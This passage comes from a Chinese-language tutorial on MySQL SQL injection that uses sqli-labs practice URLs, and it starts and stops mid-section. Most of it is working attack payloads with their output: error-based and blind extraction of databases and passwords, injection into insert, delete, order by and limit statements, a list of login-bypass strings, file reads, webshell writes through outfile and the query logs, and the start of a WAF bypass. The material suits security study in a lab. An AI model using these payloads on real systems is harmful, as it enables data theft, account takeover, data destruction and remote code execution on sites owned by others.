user()),0x7e)));\n\n\n3.updatexml()\n\nselect * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));\n\n\n4.geometrycollection()\n\nselect * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));\n\n\n5.multipoint()\n\nselect * from test where id=1 and multipoint((select * from(select * from(select user())a)b));\n\n\n6.polygon()\n\nselect * from test where id=1 and polygon((select * from(select * from(select user())a)b));\n\n\n7.multipolygon()\n\nselect * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));\n\n\n8.linestring()\n\nselect * from test where id=1 and linestring((select * from(select * from(select user())a)b));\n\n\n9.multilinestring()\n\nselect * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));\n\n10.exp()\n\nselect * from test where id=1 and exp(~(select * from(select user())a));\n\n</code></pre>\n<p>每个一个报错语句都有它的原理 比如  <code>exp()</code>  报错的原理，手册说到 exp 是一个数学函数 取 e 的 x 次方，当我们输入的值大于 709 就会报错 然后～取反它的值总会大于 709 所以报错。</p>\n<p>简单的用报错语句来注入一下把这里我就利用函数  <code>updatexml()</code></p>\n<pre><code>updatexml (XML_document, XPath_string, new_value); \nXML_document: 是String格式，为XML文档对象的名称，文中为Doc \nXPath_string : Xpath\nnew_value :String格式，替换查找到的符合条件的数据 \n\n</code></pre>\n<p>其中关键点就是 <code>XPath_string</code>  这块了 因为我们传入的的不是 <code>XPath_string</code> , 为什么要使用 <code>concat</code>  这个函数呢，因为它是个连接函数你不用的话 <code>(updatexml(1,(select user()),1))</code>  这样也可以但是需要字符中有特殊字符，才会报错，同时它会被中间的特殊字符截断，所以需要用到 <code>concat</code>  用特殊字符给他连接起来。</p>\n<pre><code>爆库：\n\nhttp://127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,(select concat(0x7e, (schema_name),0x7e) FROM information_schema.schemata limit 2,1),1) -- +\n\n爆表：\n\nhttp://127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,(select concat(0x7e, (table_name),0x7e) from information_schema.tables where table_schema='security' limit 3,1),1) -- +\n\n爆字段：\n\nhttp://127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,(select concat(0x7e, (column_name),0x7e) from information_schema.columns where table_name=0x7573657273 limit 2,1),1) -- +\n\n爆数据：\n\nhttp://127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,(select concat(0x7e, password,0x7e) from users limit 1,1),1) -- +\n\n\n\n</code></pre>\n<p>在报错里面直接使用 MySQL 最基本的查表就可以了，你也可以把 concat 放在外面  <code>updatexml(1,concat(0x7e, (select password from users limit 1,1),0x7e),1)</code></p>\n<p>自己灵活多变，这里我值得注意的是它加了连接字符 md5 只能爆出 31 位，你可以用分割函数分割出来。</p>\n<pre><code>substr(string string,num start,num length);\n\nstring为字符串\n\nstart为起始位置\n\nlength为长度\n\nhttp://127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,concat(0x7e, substr((select md5(password) from users limit 1,1),1,16),0x7e),1) -- +\n\n\n\n</code></pre>\n<p>因为我密码不是 md5 的 所以我加了个密来分割。</p>\n<h1 id=\"0x00-盲注\"><a class=\"anchor\" href=\"#0x00-盲注\">#</a> 0x00 盲注</h1>\n<p>盲注我这里只归纳为</p>\n<ol>\n<li>\n<p>时间盲注</p>\n</li>\n<li>\n<p>布尔盲注</p>\n</li>\n</ol>\n<p>其实在如今的实际环境中一般盲注的情况毕竟多，时间盲注太费时间 同时对网络要求比较高，二分，dnslog, 等等可以加快注入的进程。</p>\n<h1 id=\"0x01-盲注中值得注意的问题\"><a class=\"anchor\" href=\"#0x01-盲注中值得注意的问题\">#</a> 0x01 盲注中值得注意的问题</h1>\n<ol>\n<li>\n<p>盲注中使用 and 你得确定你查询的值得存在 。</p>\n</li>\n<li>\n<p>在返回多组数据的情况下，你的延时不再是 单纯的  <code>sleep(5)</code>  他将根据你返回的数据条数来反复执行</p>\n</li>\n<li>\n<p>在如同搜索型时尽量搜索存在且数目较少的关键词</p>\n</li>\n<li>\n<p>尽量不要使用 or</p>\n</li>\n</ol>\n<p>至于以上为什么会出现这种原因 推荐大家看看 这篇文章讲的很清楚 https://www.t00ls.net/thread-45590-1-10.html</p>\n<h1 id=\"0x02-简单时间盲注\"><a class=\"anchor\" href=\"#0x02-简单时间盲注\">#</a> 0x02 简单时间盲注</h1>\n<p>时间盲注也叫延时注入 一般用到函数  <code>sleep()</code>   <code>BENCHMARK()</code>  还可以使用笛卡尔积 (尽量不要使用，内容太多会很慢很慢), 查阅 mysql 手册会发现很多东西</p>\n<p>一般时间盲注我们还需要使用条件判断函数</p>\n<h2 id=\"if\"><a class=\"anchor\" href=\"#if\">#</a> if()</h2>\n<p><code>if（expre1，expre2，expre3）</code>  当 expre1 为 true 时，返回 expre2，false 时，返回 expre3<br />\n 盲注的同时也配合着 mysql 提供的分割函，与正则函数 like 函数，比较函数等等，还是那句话多看手册。</p>\n<pre><code>substr\nsubstring\nleft\n......\n\n</code></pre>\n<p>我们一般喜欢把分割的函数编码一下，当然不编码也行，编码的好处就是可以不用引号 常用到的就有  <code>ascii()</code>   <code>hex()</code>  等等<br />\n <code>benchmark()</code>  其作用是来测试一些函数的执行速度。benchmark () 中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式。</p>\n<pre><code>mysql&gt; select * from users where id =1 and if((substr((select user()),1,1)='r'),sleep(5),1);\nEmpty set (5.01 sec)\n\nmysql&gt; select * from users where id =1 and if((substr((select user()),1,1)='r1'),sleep(5),1);\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | Dumb     | Dumb     |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\nmysql&gt; select * from users where id =1 and if((substr((select user()),1,1)='r'),BENCHMARK(20000000,md5('a')),1);\nEmpty set (5.15 sec)\n\n</code></pre>\n<h2 id=\"case-when-then-else-end\"><a class=\"anchor\" href=\"#case-when-then-else-end\">#</a> case when then else end</h2>\n<pre><code>mysql&gt; select * from users where id =1 and case when (substr((select user()),1,1)=&quot;rr&quot;) then sleep(3) else 1 end;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | Dumb     | Dumb     |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\nmysql&gt; select * from users where id =1 and case when (substr((select user()),1,1)=&quot;r&quot;) then sleep(3) else 1 end;\nEmpty set (3.00 sec)\n\n</code></pre>\n<p>不推荐使用笛卡尔积当数据过多时会造成 DOS。</p>\n<h1 id=\"0x03-布尔盲注\"><a class=\"anchor\" href=\"#0x03-布尔盲注\">#</a> 0x03 布尔盲注</h1>\n<p>盲注思路的思路很多 比如正则匹配，比较函数，运算符，推荐大家可以看看<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTcwNjI2\"> https://www.anquanke.com/post/id/170626</span></p>\n<ol>\n<li>直接通过字符串截取对比，类似函数很多后面做个总结吧</li>\n</ol>\n<pre><code>http://127.0.0.1/sqli/Less-1/?id=1' and substr((select user()),1,1)='r' -- +\n</code></pre>\n<ol start=\"2\">\n<li>用  <code>IFNULL()</code>  函数</li>\n</ol>\n<pre><code>http://127.0.0.1/sqli/Less-1/?id=1' and IFNULL((substr((select user()),1,1)='r'),0) -- +\n\n</code></pre>\n<ol start=\"3\">\n<li>使用 比较函数 <code>strcmp()</code></li>\n</ol>\n<pre><code>1.\n\nhttp://127.0.0.1/sqli/Less-1/?id=1' and strcmp((substr((select user()),1,1)='r'),1) -- +\nhttp://127.0.0.1/sqli/Less-1/?id=1' and strcmp((substr((select user()),1,1)='r'),0) -- +\n\n\n2.\n\nmysql&gt; select * from users where id =1 and 0=strcmp((substr((select user()),1,1)),'o');\nEmpty set (0.00 sec)\n\nmysql&gt; select * from users where id =1 and 0=strcmp((substr((select user()),2,1)),'o');\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | Dumb     | Dumb     |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\n\n</code></pre>\n<h1 id=\"0x04-小技巧\"><a class=\"anchor\" href=\"#0x04-小技巧\">#</a> 0x04 小技巧</h1>\n<p>在没有办法的情况下必须使用到 or 的延时注入不如试试子查询，他也只将延时 5s</p>\n<pre><code>http://192.168.130.135/Less-1/?id=1'  or if((substr((select user()),1,1)='r'),((select sleep(5) from information_schema.schemata as b)),1);-- +\n\n</code></pre>\n<h1 id=\"0x00-insertdeleteupdate-注入\"><a class=\"anchor\" href=\"#0x00-insertdeleteupdate-注入\">#</a> 0x00 insert,delete,update 注入</h1>\n<p>insert,delete,update 主要是用到盲注和报错注入，此类注入点不建议使用 sqlmap 等工具，会造成大量垃圾数据，和其他情况。</p>\n<h1 id=\"0x01-insertdeleteupdate\"><a class=\"anchor\" href=\"#0x01-insertdeleteupdate\">#</a> 0x01 insert,delete,update</h1>\n<h2 id=\"insert\"><a class=\"anchor\" href=\"#insert\">#</a> insert</h2>\n<p>可以看到假如没闭合是会产生很多垃圾数据的，所以这类注入建议手工或者自己写工具。</p>\n<p>一般这种注入会出现在 注册、ip 头、留言板等等需要写入数据的地方，同时这种注入不报错一般较难发现。</p>\n<ol>\n<li>报错</li>\n</ol>\n<pre><code>mysql&gt; insert into admin (id,username,password) values (2,&quot;or updatexml(1,concat(0x7e,(version())),0) or&quot;,&quot;admin&quot;);\nQuery OK, 1 row affected (0.00 sec)\n\nmysql&gt; select * from admin;\n+------+-----------------------------------------------+----------+\n| id   | username                                      | password |\n+------+-----------------------------------------------+----------+\n|    1 | admin                                         | admin    |\n|    1 | and 1=1                                       | admin    |\n|    2 | or updatexml(1,concat(0x7e,(version())),0) or | admin    |\n+------+-----------------------------------------------+----------+\n3 rows in set (0.00 sec)\n\nmysql&gt; insert into admin (id,username,password) values (2,&quot;&quot;or updatexml(1,concat(0x7e,(version())),0) or&quot;&quot;,&quot;admin&quot;);\nERROR 1105 (HY000): XPATH syntax error: '~5.5.53'\n\n</code></pre>\n<ol start=\"2\">\n<li>盲注</li>\n</ol>\n<p>int 型 可以使用 运算符 比如 加减乘除 and or 异或 移位等等</p>\n<pre><code>mysql&gt; insert into admin values (2+if((substr((select user()),1,1)='r'),sleep(5),1),'1',&quot;admin&quot;);\nQuery OK, 1 row affected (5.00 sec)\n\nmysql&gt; insert into admin values (2+if((substr((select user()),1,1)='p'),sleep(5),1),'1',&quot;admin&quot;);\nQuery OK, 1 row affected (0.00 sec)\n\n</code></pre>\n<p>字符型注意闭合不能使用 and</p>\n<pre><code>mysql&gt; insert into admin values (2,''+if((substr((select user()),1,1)='p'),sleep(5),1)+'',&quot;admin&quot;);\nQuery OK, 1 row affected (0.00 sec)\n\nmysql&gt; insert into admin values (2,''+if((substr((select user()),1,1)='r'),sleep(5),1)+'',&quot;admin&quot;);\nQuery OK, 1 row affected (5.01 sec)\n\n</code></pre>\n<p>注意盲注产生大量垃圾数据。</p>\n<h2 id=\"delete\"><a class=\"anchor\" href=\"#delete\">#</a> delete</h2>\n<p>报错注入同上</p>\n<p>值得注意的时 delete 注入很危险，很危险，很危险。</p>\n<p>语句不当 将会亲人泪两行  <code>or 1=1</code>  因为 1=1 为 true 所以每一行被删除了，他以前用 sqlmap 一把梭 现在过的很好，每顿都有人送饭到手上。</p>\n<p>所以在 delete 注入时使用 or 一定要为 false</p>\n<pre><code>mysql&gt; delete from admin where id =3 or 1=1;\nQuery OK, 4 rows affected (0.00 sec)\n\n</code></pre>\n<p>报错注入</p>\n<pre><code>mysql&gt; delete from admin where id =-2 or updatexml(1,concat(0x7e,(version())),0);\nERROR 1105 (HY000): XPATH syntax error: '~5.5.53'\n\n\n\n</code></pre>\n<p>盲注</p>\n<p>or 配上  <code>if()</code>  函数使用不当 再提下 if (expr1,expr2,expr3)，如果 expr1 的值为 true，返回 expr2 的值，如果 expr1 的值为 false，<br />\n返回 expr3 的值。</p>\n<pre><code>mysql&gt; delete from admin where id =-2 or if((substr((select user()),1,1)='r4'),sleep(5),1);\nQuery OK, 3 rows affected (0.00 sec)\n\n</code></pre>\n<p>所以 delete 中 or 的正确使用方法 (or 右边要为 false)</p>\n<pre><code>mysql&gt; delete from admin where id =-2 or if((substr((select user()),1,1)='r4'),sleep(5),0);\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql&gt; delete from admin where id =-2 or if((substr((select user()),1,1)='r'),sleep(5),0);\nQuery OK, 0 rows affected (5.00 sec)\n\n</code></pre>\n<h2 id=\"update\"><a class=\"anchor\" href=\"#update\">#</a> update</h2>\n<p>与上面的类似</p>\n<pre><code>mysql&gt; select * from admin;\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    2 | 1        | admin    |\n|    2 | 1        | admin    |\n|    2 | 1        | admin    |\n|    2 | admin    | admin    |\n+------+----------+----------+\n4 rows in set (0.00 sec)\n\nmysql&gt; update admin set id=&quot;5&quot;+sleep(5)+&quot;&quot; where id=2;\nQuery OK, 4 rows affected (20.00 sec)\nRows matched: 4  Changed: 4  Warnings: 0\n</code></pre>\n<h1 id=\"0x02-文末-2\"><a class=\"anchor\" href=\"#0x02-文末-2\">#</a> 0x02 文末</h1>\n<p>update，insert 注入怎么找，我们可以尝试性插入、引号、双引号、转义符 \\ 让语句不能正常执行，然后如果插入失败，更新失败，然后深入测试确定是否存在注入</p>\n<h1 id=\"0x00-二次注入\"><a class=\"anchor\" href=\"#0x00-二次注入\">#</a> 0x00 二次注入</h1>\n<p>二次注入的原理是 sql 语句没有被转义直接存入数据库，然后在被读取查询而导致的。</p>\n<p>二次注入在 php 种通常见于，插入时被 <code>addslashes()</code>   <code>get_magic_quotes_gpc</code>  等等转义，但是写入数据库时还是使用原来的数据，二次注入造成原因时多种多样的。</p>\n<p>在没有被单引号包裹的 sql 语句下，我们可以用 16 进制编码他，这样就不会带有单引号等。</p>\n<pre><code>mysql&gt; insert into admin (id,name,pass) values ('3',0x61646D696E27313131,'11');\nQuery OK, 1 row affected (0.00 sec)\n\nmysql&gt; select * from admin;\n+----+-----------+-------+\n| id | name      | pass  |\n+----+-----------+-------+\n|  1 | admin     | admin |\n|  2 | admin'111 | 11111 |\n|  3 | admin'111 | 11    |\n+----+-----------+-------+\n4 rows in set (0.00 sec)\n\n</code></pre>\n<p>想要具体了解这个 大家可以做做 sqli-labs 24 课，二次注入在没有源码的情况比较难发现，通常见于注册，</p>\n<h1 id=\"0x01-宽字节注入\"><a class=\"anchor\" href=\"#0x01-宽字节注入\">#</a> 0x01 宽字节注入</h1>\n<pre><code>1.没使用宽字节\n%27 -&gt; %5C%27\n\n2. 试用宽字节\n\n%df%27 -&gt; %df%5c%27 -&gt; 運'\n</code></pre>\n<ol>\n<li>\n<p>在我们输入单引号时  <code>addslashes()</code>  或者 <code>get_magic_quotes_gpc</code>  给我们的单引号加入了转义字符 <code>\\</code>  就变成了 <code>\\'</code></p>\n</li>\n<li>\n<p>我们输入经过转换后由于编码的不同把 <code>%df%5c</code>  转换为了一个汉字。</p>\n</li>\n</ol>\n<p>想要具体了解找个的可以 做做 sqli-labs 33 课</p>\n<h1 id=\"0x00-order-by-注入\"><a class=\"anchor\" href=\"#0x00-order-by-注入\">#</a> 0x00 order by 注入</h1>\n<p>这是一种特殊的注入 sql 语句为  <code>select * from admin order by $id</code>  我们一般用 order by 来判断他的列数，其实他就是一个依照第几个列来排序的过程。</p>\n<p>order by 注入是不能 直接使用 <code>and 1=1</code>  来判断的，他需要用到条件语句。</p>\n<pre><code>mysql&gt; select * from admin order by id;\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    1 | cdmin    | bdmin    |\n|    2 | admin    | ddmin    |\n|    3 | bdmin    | fdmin    |\n+------+----------+----------+\n3 rows in set (0.00 sec)\n\nmysql&gt; select * from admin order by username;\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    2 | admin    | ddmin    |\n|    3 | bdmin    | fdmin    |\n|    1 | cdmin    | bdmin    |\n+------+----------+----------+\n3 rows in set (0.00 sec)\n\n</code></pre>\n<h2 id=\"盲注\"><a class=\"anchor\" href=\"#盲注\">#</a> 盲注</h2>\n<ol>\n<li>布尔</li>\n</ol>\n<p>简单的判断</p>\n<pre><code>mysql&gt; select * from admin order by if(1=1,username,password);\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    2 | admin    | ddmin    |\n|    3 | bdmin    | fdmin    |\n|    1 | cdmin    | bdmin    |\n+------+----------+----------+\n3 rows in set (0.00 sec)\n\nmysql&gt; select * from admin order by if(1=3,username,password);\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    1 | cdmin    | bdmin    |\n|    2 | admin    | ddmin    |\n|    3 | bdmin    | fdmin    |\n+------+----------+----------+\n3 rows in set (0.00 sec)\n\n</code></pre>\n<p>简单的注入</p>\n<pre><code>mysql&gt; select * from admin order by if((substr((select user()),1,1)='r1'),username,password);\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    1 | cdmin    | bdmin    |\n|    2 | admin    | ddmin    |\n|    3 | bdmin    | fdmin    |\n+------+----------+----------+\n3 rows in set (0.00 sec)\n\nmysql&gt; select * from admin order by if((substr((select user()),1,1)='r'),username,password);\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    2 | admin    | ddmin    |\n|    3 | bdmin    | fdmin    |\n|    1 | cdmin    | bdmin    |\n+------+----------+----------+\n3 rows in set (0.00 sec)\n\n\nhttp://127.0.0.1/sqli/Less-46/?sort=if((substr((select user()),1,1)='r'),username,password)\n\n</code></pre>\n<ol start=\"2\">\n<li>时间盲注</li>\n</ol>\n<p>时间盲注不能直接简单的 <code>sleep()</code>  因为他会对每条内容来执行你的语句，所以会造成 dos 测试获取速度慢等问题，这时候我们需要用到子查询</p>\n<pre><code>mysql&gt; select * from admin order by if((substr((select user()),1,1)='r'),sleep(5),password);\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    3 | bdmin    | fdmin    |\n|    2 | admin    | ddmin    |\n|    1 | cdmin    | bdmin    |\n+------+----------+----------+\n3 rows in set (15.01 sec)\n\n</code></pre>\n<p>我们写一条简单的子查询试试</p>\n<pre><code>mysql&gt; select * from admin order by if((substr((select user()),1,1)='r'),(select 1 from (select sleep(2)) as b),password);\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    3 | bdmin    | fdmin    |\n|    2 | admin    | ddmin    |\n|    1 | cdmin    | bdmin    |\n+------+----------+----------+\n3 rows in set (2.01 sec)\n\n</code></pre>\n<h2 id=\"报错注入\"><a class=\"anchor\" href=\"#报错注入\">#</a> 报错注入</h2>\n<pre><code>http://127.0.0.1/sqli/Less-46/?sort=(extractvalue(1,concat(0x3a,version())),1)\n\nmysql&gt; select * from admin order by (extractvalue(1,concat(0x3a,version())),1);\nERROR 1105 (HY000): XPATH syntax error: ':5.5.53'\n\n</code></pre>\n<h1 id=\"0x01-from\"><a class=\"anchor\" href=\"#0x01-from\">#</a> 0x01 From</h1>\n<p>from 后面的注入比较少 还是提一下</p>\n<pre><code>select * from $id;\n\n</code></pre>\n<ol>\n<li>\n<p>可以结合 order by 来注入</p>\n</li>\n<li>\n<p>可以使用联合注入来注入</p>\n</li>\n</ol>\n<pre><code>mysql&gt; select * from admin union select 1,user(),3;\n+------+----------------+----------+\n| id   | username       | password |\n+------+----------------+----------+\n|    3 | bdmin          | fdmin    |\n|    2 | admin          | ddmin    |\n|    1 | cdmin          | bdmin    |\n|    1 | root@localhost | 3        |\n+------+----------------+----------+\n4 rows in set (0.02 sec)\n\n</code></pre>\n<p>方法跟普通注入一样的一样自己加上表名</p>\n<h1 id=\"0x02-limit\"><a class=\"anchor\" href=\"#0x02-limit\">#</a> 0x02 limit</h1>\n<p>这种注入也不是很常见，依照 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXRlaXAuY29tL2Jsb2cvc3FsLWluamVjdGlvbnMtaW4tbXlzcWwtbGltaXQtY2xhdXNlLw==\">https://rateip.com/blog/sql-injections-in-mysql-limit-clause/</span> 来提一下</p>\n<pre><code>mysql&gt; select * from admin where id &gt;0 limit 0,1 $id\n\n</code></pre>\n<p>如何利用呢 大佬们已经给出方法了 用  <code>PROCEDURE ANALYSE</code>  配合报错注入，所以多看文档，如果你想提升下自己的水平</p>\n<pre><code>mysql&gt; select * from admin where id &gt;0 order by id limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);\nERROR 1105 (HY000): XPATH syntax error: ':5.5.53'\nERROR:\nNo query specified\n\n</code></pre>\n<p>这里延时只能使用 <code>BENCHMARK()</code>  如同</p>\n<pre><code>select * from admin where id &gt;0 order by id limit 0,1 PROCEDURE analyse(extractvalue(rand(),concat(0x3a,(if(1=1,benchmark(2000000,md5(404)),1)))),1);\n\n</code></pre>\n<h1 id=\"0x00-再谈万能密码登陆\"><a class=\"anchor\" href=\"#0x00-再谈万能密码登陆\">#</a> 0x00 再谈万能密码登陆</h1>\n<p>万能密码基本大家都用过，各种各样的，如下</p>\n<pre><code>'or 1=1/*\n&quot;or &quot;a&quot;=&quot;a\n&quot;or 1=1--\n&quot;or&quot;=&quot;\n&quot;or&quot;=&quot;a'='a\n&quot;or1=1--\n&quot;or=or&quot;\n''or'='or'\n') or ('a'='a\n'.).or.('.a.'='.a\n'or 1=1\n'or 1=1--\n'or 1=1/*\n'or&quot;=&quot;a'='a\n'or' '1'='1'\n'or''='\n'or''=''or''='\n'or'='1'\n'or'='or'\n'or.'a.'='a\n'or1=1--\n1'or'1'='1\na'or' 1=1--\na'or'1=1--\nor 'a'='a'\nor 1=1--\nor1=1--\n\n</code></pre>\n<p>其实根据前面的文章我们很容易看出 他的原理就是让我们的条件恒成立 至于为什么这么多种，就是根据语句的形势来闭合的，</p>\n<p>这里面涉及到运算符的优先级，MySQL 运算的特性，然后下面我们以几个例子来做做最另类的万能密码</p>\n<pre><code>mysql&gt; select * from admin where name = '/*' and pass = '*/';\nEmpty set (0.00 sec)\n\n</code></pre>\n<p>注释绕过</p>\n<pre><code>mysql&gt; select * from admin where name = ''or 1=1-- ' and pass = '123';\n    -&gt; ;\n+----+-----------+-------+\n| id | name      | pass  |\n+----+-----------+-------+\n|  1 | admin     | admin |\n|  2 | admin'111 | 11111 |\n|  3 | admin'111 | 11    |\n|  4 | admin'111 | 11    |\n+----+-----------+-------+\n4 rows in set (0.00 sec)\n\n</code></pre>\n<p>经典的 <code>or 1=1--</code>  其中 1=1 恒为 true 然后导致每条数据都成立返回</p>\n<p>那么知道了这个原理怎么构造一个简单的万能密码呢</p>\n<pre><code>mysql&gt; select ''=0\n    -&gt; ;\n+------+\n| ''=0 |\n+------+\n|    1 |\n+------+\n1 row in set (0.00 sec)\n\nmysql&gt; select 1=0=0;\n+-------+\n| 1=0=0 |\n+-------+\n|     1 |\n+-------+\n1 row in set (0.30 sec)\n\n</code></pre>\n<p>我们可以看到在 mysql 中 空字符串 '' 等于 0 为 1 也就是 true 知道这个特性我们可以来构造我们的万能密码了</p>\n<pre><code>mysql&gt; select * from admin where name = ''|0#'  and pass = '123';\n    -&gt; ;\n+----+-----------+-------+\n| id | name      | pass  |\n+----+-----------+-------+\n|  1 | admin     | admin |\n|  2 | admin'111 | 11111 |\n|  3 | admin'111 | 11    |\n|  4 | admin'111 | 11    |\n+----+-----------+-------+\n4 rows in set, 5 warnings (0.00 sec)\n\n</code></pre>\n<p>仅仅用了  <code>'|0#</code>  个字符就能达到我们的效果 其他方法大家还可以测试，因为是自己发现的，然后问了几个师傅 发现 ctf 已经别人都用过了 ，不得不承认自己的知识量远远不够。</p>\n<h1 id=\"0x00-读写文件与堆叠查询\"><a class=\"anchor\" href=\"#0x00-读写文件与堆叠查询\">#</a> 0x00 读写文件与堆叠查询</h1>\n<p>MySQL 中 在在 mysql 5.6.34 版本以后 secure_file_priv 的值默认为 NULL , 而 secure_file_priv 为 null 那么我们就不能导出文件，以下都建立在</p>\n<p>secure_file_priv 的默认值被修改为无才能利用，且这个只能手工修改配置文件不能用 sql 语句，也就是想直接导出需要管理员不知道干了什么帮你修改好这个权限才行。</p>\n<p>windows 系统在 my.ini 的 [mysqld] 下面加上 secure_file_priv = ，linux 的在 /etc/my.cnf 同时读写权限问题就不用说了。</p>\n<pre><code>mysql&gt; show global variables like '%secure%';\n+------------------+-------+\n| Variable_name    | Value |\n+------------------+-------+\n| secure_auth      | OFF   |\n| secure_file_priv |       |\n+------------------+-------+\n2 rows in set (0.00 sec)\n\n</code></pre>\n<h1 id=\"0x01-读文件\"><a class=\"anchor\" href=\"#0x01-读文件\">#</a> 0x01 读文件</h1>\n<p>可以把文件 hex 一下输出，文件名也是支持 hex 和 char 的</p>\n<pre><code>mysql&gt; select * from admin union select 1,hex(load_file('D:\\\\1.txt')),3;\n+------+------------------------+----------+\n| id   | username               | password |\n+------+------------------------+----------+\n|    3 | bdmin                  | fdmin    |\n|    2 | admin                  | ddmin    |\n|    1 | cdmin                  | bdmin    |\n|    1 | 617574686F72A3BA343034 | 3        |\n+------+------------------------+----------+\n4 rows in set (0.02 sec)\n\nhttp://127.0.0.1/sqli/Less-1/?id=-1' union select 1,hex(load_file(0x463A5C5C312E747874)),3-- +\n\n</code></pre>\n<p>当然你加入你进了 phpmyadmin 类似的平台 可以执行 sql 语句，你可以选择把导入的数据插入表中<br />\n同时支持导入的函数还有  <code>load data infile</code></p>\n<pre><code>create table test(test text);\ninsert into test(test) values (load_file('D:\\\\1.txt'));\nselect * from test;\n\n</code></pre>\n<p>如果能读文件在渗透测试中往往很有用，可以读取配置文件，系统问题等等关键信息，在我以前的一次意淫中，进入一个后台功能全被限制死了，但是可以执行导入，通过一个编辑器的目录遍历，发现某文件时间不一致，读取出来发现是 webshell，应该是某黑客进去之后做的手脚</p>\n<h1 id=\"0x02-写文件\"><a class=\"anchor\" href=\"#0x02-写文件\">#</a> 0x02 写文件</h1>\n<ol>\n<li></li>\n</ol>\n<p>写文件我们一般用到  <code>dumpfile</code>  与 <code>outfile</code>  她们其实是有区别</p>\n<p><code>outfile</code>  会在行末写入新行，而且会转义换行符</p>\n<p><code>dumpfile</code>  能导出一个完整的文件，不会有任何转义 所以我们 udf 提取一般用的 dumpfile</p>\n<pre><code>\nmysql&gt; select * from admin where id =1 union select 1,'&lt;?php eval($_POST[cmd]);?&gt;',3 into outfile 'G:\\\\test.txt';\nQuery OK, 2 rows affected (0.00 sec)\n\n</code></pre>\n<ol start=\"2\">\n<li></li>\n</ol>\n<p>后来大佬们找到一种方法通过日志来写 shell 解决这个史诗级难题，但是需要能直接执行 sql 语句利用有限</p>\n<pre><code>set global general_log=on;\nset global general_log_file='D://404.php';\nselect '&lt;?php eval($_POST['404']) ?&gt;';\n\n</code></pre>\n<p>通过把日志路径更改 ，让查询的日志保存过去，还有一种慢日志，原理一样</p>\n<pre><code>mysql&gt; show global variables like '%query_log%'\n    -&gt; ;\n+---------------------+-------------------------------------------------------------+\n| Variable_name       | Value                                                       |\n+---------------------+-------------------------------------------------------------+\n| slow_query_log      | OFF                                                         |\n| slow_query_log_file | D:\\phpstudy\\PHPTutorial\\MySQL\\data\\LAPTOP-M4APUKKN-slow.log |\n+---------------------+-------------------------------------------------------------+\n2 rows in set (0.00 sec)\n\n</code></pre>\n<pre><code>set global slow_query_log=1;\n\nset global slow_query_log_file='D://404.php'\n\nselect '&lt;?php eval($_POST['404']) ?&gt;' or sleep(15);\n\n</code></pre>\n<h1 id=\"0x03-堆叠查询\"><a class=\"anchor\" href=\"#0x03-堆叠查询\">#</a> 0x03 堆叠查询</h1>\n<p>mysql 是支持堆叠查询的用 <code>;</code>  分割语句，但是 php 原生的连接方式不支持，但是使用 PDO,mysqli_multi_query () 等等是支持多语句的，在我们使用堆叠查询的时候基本是没有回显的，而且其实很难遇到这种环境。</p>\n<pre><code>mysql&gt; select * from admin where id =1;select user();\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    1 | cdmin    | bdmin    |\n+------+----------+----------+\n1 row in set (0.00 sec)\n\n+----------------+\n| user()         |\n+----------------+\n| root@localhost |\n+----------------+\n1 row in set (0.00 sec)\n\n</code></pre>\n<p>这里讲在一起就是因为，假如支持堆叠查询还可以用日志来写 shell。</p>\n<pre><code>\nhttp://192.168.59.129/Less-38/?id=1%27;set global general_log=on;set global general_log_file='C://phpstudy//404.php';--+\n\nhttp://192.168.59.129/Less-38/?id=1%27;select '&lt;?php eval($_POST[404]) ?&gt;';--+\n\n</code></pre>\n<h1 id=\"0x00-联合注入过狗\"><a class=\"anchor\" href=\"#0x00-联合注入过狗\">#</a> 0x00 联合注入过狗</h1>\n<p>其实我们过这些 waf 就是个正则的绕过，因为这种通用型的 waf，需要考虑到用户体验，他不能出现什么东西就直接拦截，比正则过滤的一些好绕一点，如何成功绕过我们需要具备对 mysql 各个函数、语法、特性的熟悉，然后通过不断的 fuzz 来测试出我们想要的 payload 的</p>\n<p>每个狗的版本不同，他的正则也是不同的所以有的 payload 在最新版可以用，在老版本就可能用不上，当你的知识量有一定的积累后，绕过 waf 或许就很简单，</p>\n<p>如何快速的提升自己的这些知识，多看文章，多看官方手册。</p>\n<h1 id=\"0x01-探索-and\"><a class=\"anchor\" href=\"#0x01-探索-and\">#</a> 0x01 探索 and</h1>\n<p>实验环境 ： win2003 apache 安全狗 4.0.23957</p>\n<p>首先我们来探索简单的语句  <code>and 1=1</code></p>\n<pre><code>and 1    拦截\nand '1'  拦截\nand a    不拦截\nand 'a'  拦截\nand !    不拦截\nand 1+1  拦截\nand 1+a  拦截\nand hex(1) 不拦截\n\n</code></pre>\n<p>通过测试我们发现当 and 后面跟上 数字型和字符型时他会给我们拦截掉 ，其实我们在安全狗的规则里面可以看到他拦截 and 和 or 所以我们有 2 